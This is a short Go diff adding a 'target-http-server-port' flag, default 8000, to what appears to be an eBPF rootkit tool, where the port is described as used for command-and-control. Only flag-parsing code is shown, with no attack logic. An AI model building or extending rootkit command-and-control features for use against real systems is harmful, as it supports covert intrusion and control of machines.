@@ -33,4 +33,10 @@ func init() {
 		"log-level",
 		"l",
 		`log level, options: panic, fatal, error, warn, info, debug or trace`)
+	EBPFKit.Flags().IntVarP(
+		&options.EBPFKit.TargetHTTPServerPort,
+		"target-http-server-port",
+		"p",
+		8000,
+		"Target HTTP server port used for C&C")
 }
